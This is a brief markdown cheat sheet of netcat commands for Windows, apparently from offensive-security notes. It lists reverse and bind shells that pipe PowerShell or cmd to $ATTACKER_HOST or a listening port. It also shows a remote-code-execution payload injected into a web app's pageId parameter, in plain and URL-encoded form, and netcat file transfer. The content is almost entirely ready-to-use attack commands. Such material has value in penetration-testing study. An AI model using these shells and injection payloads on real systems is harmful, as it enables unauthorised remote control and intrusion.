
## Reverse Powershell

```
#32bit
nc.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell
#64bit
nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell
```

Example RCE on web app:

```
http://vulnerable.com?pageId=nc64.exe 10.10.10.10 1337 -e powershell
```

Of course in the wild, we would url encode it:

```
http://vulnerable.com?pageId=nc64.exe%2010.10.10.10%201337%20-e%20powershell
```

## Bind Powershell

```
#32bit
nc.exe -l -p $LISTENPORT -e powershell
#64bit
nc64.exe -l -p $LISTENPORT -e powershell
```

## Reverse Shell

```
#32bit
nc.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd
#64bit
nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd
```

## Bind Shell

```
#32bit
nc.exe -l -p $LISTENPORT -e cmd
#64bit
nc64.exe -l -p $LISTENPORT -e cmd
```

## Transfer File

**Sender (Unix)**

```
nc $TARGET $PORT < $FILE
```

**Receiver (Windows)**

```
#32bit
nc.exe -l -p $LISTENPORT > $FILE
#64bit
nc64.exe -l -p $LISTENPORT > $FILE
```